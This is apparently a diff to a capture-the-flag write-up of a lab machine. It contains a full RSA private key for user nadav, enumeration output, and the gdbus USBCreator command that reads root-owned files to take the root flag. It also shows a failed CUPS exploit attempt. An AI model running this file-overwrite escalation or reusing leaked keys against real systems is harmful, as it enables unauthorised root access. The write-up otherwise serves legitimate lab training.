@@ -252,7 +252,7 @@ cat user.txt
 
 ```
 
-## ssh-key
+## paul ssh-key
 ```
 paul@passage:~/.ssh$ cat id_rsa
 cat id_rsa
@@ -295,6 +295,15 @@ load pubkey "id_rsa": invalid format
 Last login: Mon Dec 28 05:27:53 2020 from 10.10.14.52
 paul@passage:~$
 ```
+
+```
+paul@passage:~$ whoami && id && pwd && groups
+paul
+uid=1001(paul) gid=1001(paul) groups=1001(paul)
+/home/paul
+paul
+```
+
 Paul has Nadav's public key in his authorized_keys file, maybe Nadav has Paul's public key in his authorized_keys file too...
 ```
 paul@passage:~$ cat .ssh/authorized_keys 
@@ -322,3 +331,282 @@ Last login: Mon Dec 28 05:43:31 2020 from 10.10.10.206
 nadav@passage:~$ 
 ```
 
+## nadav ssh-key
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
++L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
+Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt
+rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ
+JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok
+sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ
+eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG
+QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr
+lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh
+zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz
+R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k
+7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio
+GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4
+IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE
+LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR
+AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0
+VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt
+1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0
+KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1
+9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF
+d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs
+nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY
+f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM
+Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs
+OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==
+-----END RSA PRIVATE KEY-----
+
+## Nadav
+```
+nadav@passage:~$ whoami && id && pwd && groups
+nadav
+uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+/home/nadav
+nadav adm cdrom sudo dip plugdev lpadmin sambashare
+nadav@passage:~$ cat /etc/*-release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
+NAME="Ubuntu"
+VERSION="16.04.6 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04.6 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial
+```
+
+## LinEnum with linpeas
+in yellowred:
+nadav user in sudo group
+```
+====================================( Users Information )=====================================
+[+] My user                                                                                                                                                                                                                                
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                                                                                                                                      
+uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) ---------------------------------------------------yellowred-----------------                                                                                                              
+
+[+] Do I have PGP keys?
+                                                                                                                                                                                                                                           
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found                                                                                                                                                                                                                   
+                                                                                                                                                                                                                                           
+[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                              
+                                                                                                                                                                                                                                           
+[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                              
+/proc/sys/kernel/yama/ptrace_scope is not enabled (1)                                                                                                                                                                                      
+gdb was found in PATH
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found                                                                                                                                                                                                                   
+                                                                                                                                                                                                                                           
+[+] Checking Pkexec policy
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                                                                    
+                                                                                                                                                                                                                                           
+[Configuration]
+AdminIdentities=unix-user:0
+[Configuration]
+AdminIdentities=unix-group:sudo;unix-group:admin---------------------------------------------------yellowred-----------------
+
+``` 
+interesting processes:
+```
+nadav@passage:~$ ps aux | grep root
+...
+root        935  0.0  0.1 228240  6256 ?        Sl   07:18   0:00 lightdm --session-child 12 15
+...
+root       1705  0.2  0.4 889580 17136 ?        Sl   07:18   0:00 /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -x -b
+...
+root       1991  0.1  0.4 235516 19712 ?        Sl   07:19   0:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
+```
+
+lightdm:
+- https://www.exploit-db.com/exploits/41923
+
+usb-creator-helper:
+- https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/?web_view=true, by Nadav Markus ;)...
+- https://en.wikipedia.org/wiki/D-Bus
+
+
+A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu patched the relevant packages in response to a vulnerability disclosure from Unit 42.
+
+Services available on the system bus:
+```
+nadav@passage:~$ qdbus --system
+:1.0                                                                                                                                                                                                                                       
+ org.freedesktop.systemd1
+:1.14
+ org.freedesktop.DisplayManager
+:1.16
+:1.17
+:1.19
+:1.2
+ org.freedesktop.Accounts
+:1.20
+:1.21
+:1.22
+:1.23
+ org.freedesktop.UPower
+:1.24
+:1.25
+:1.26
+:1.27
+:1.28
+:1.29
+:1.3
+ org.freedesktop.Avahi
+:1.30
+:1.33
+:1.34
+ org.freedesktop.RealtimeKit1
+:1.35
+ org.freedesktop.ColorManager
+:1.36
+:1.39
+:1.4
+ org.freedesktop.login1
+:1.40
+ org.freedesktop.UDisks2
+:1.41
+:1.43
+:1.44
+:1.45
+:1.46
+:1.47
+:1.48
+:1.49
+ org.freedesktop.fwupd
+:1.52
+:1.53
+:1.56
+ com.ubuntu.USBCreator
+:1.59
+:1.60
+:1.61
+:1.62
+:1.63
+:1.68
+:1.8
+ org.freedesktop.NetworkManager
+:1.9
+ org.freedesktop.PolicyKit1
+org.freedesktop.DBus
+```
+
+to invoke a method on a remote object:
+```
+nadav@passage:~$ gdbus --help
+Unknown command '--help'
+Usage:
+  gdbus COMMAND
+
+Commands:
+  help         Shows this information
+  introspect   Introspect a remote object
+  monitor      Monitor a remote object
+  call         Invoke a method on a remote object
+  emit         Emit a signal
+
+Use "gdbus COMMAND --help" to get help on each command.
+
+nadav@passage:~$ gdbus call --help
+Usage:                                                                                                                                                                                                                                     
+  gdbus call [OPTION...]                                                                                                                                                                                                                   
+                                                                                                                                                                                                                                           
+Invoke a method on a remote object.                                                                                                                                                                                                        
+                                                                                                                                                                                                                                           
+Connection Endpoint Options:                                                                                                                                                                                                               
+  -y, --system          Connect to the system bus                                                                                                                                                                                          
+  -e, --session         Connect to the session bus                                                                                                                                                                                         
+  -a, --address         Connect to given D-Bus address                                                                                                                                                                                     
+
+Application Options:
+  -d, --dest            Destination name to invoke method on
+  -o, --object-path     Object path to invoke method on
+  -m, --method          Method and interface name
+  -t, --timeout         Timeout in seconds
+
+
+```
+
+# ROOT FLAG
+
+```
+nadav@passage:/$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/pwn true
+()
+nadav@passage:/$ cat /tmp/pwn 
+cc37714bf9d23325a3a12bcb8607ebec
+```
+
+rabbit hole
+
+631 port:
+
+[Internet Printing Protocol](http://www.t1shopper.com/tools/port-number/631/)
+[IPP exploit - CUPS](https://www.exploit-db.com/exploits/41233)
+```
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                                                                                 
+Active Internet connections (servers and established)                                                                                                                                                                                      
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               ---------------------------------------------------red-----------------
+tcp        0      0 10.10.10.206:58044      10.10.14.17:4242        ESTABLISHED -               
+tcp        0      0 10.10.10.206:22         10.10.14.52:48530       ESTABLISHED -               
+tcp        0   5144 10.10.10.206:22         10.10.14.52:48708       ESTABLISHED -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
+tcp6       0      0 10.10.10.206:80         10.10.14.17:56442       ESTABLISHED -               
+tcp6       0      0 10.10.10.206:80         10.10.14.17:56450       TIME_WAIT   -               
+udp        0      0 0.0.0.0:631             0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:48722           0.0.0.0:*                           -               
+udp6       0      0 :::39667                :::*                                -               
+udp6       0      0 :::5353                 :::*                                -     
+```
+41233.py script exploit, seem unexploitable:
+```
+nadav@passage:~$ python2 41233.py -a 127.0.0.1 -b 631 -f
+
+             lol ty google
+             0000000000000
+          0000000000000000000   00
+       00000000000000000000000000000
+      0000000000000000000000000000000
+    000000000             0000000000
+   00000000               0000000000
+  0000000                000000000000
+ 0000000               000000000000000
+ 000000              000000000  000000
+0000000            000000000     000000
+000000            000000000      000000
+000000          000000000        000000
+000000         00000000          000000
+000000       000000000           000000
+0000000    000000000            0000000
+ 000000   000000000             000000
+ 0000000000000000              0000000
+  0000000000000               0000000
+   00000000000              00000000
+   00000000000            000000000
+  0000000000000000000000000000000
+   00000000000000000000000000000
+     000  0000000000000000000
+             0000000000000
+              @0x00string
+https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py
+
+[*]     locate available printer
+[-]     no printers
+```
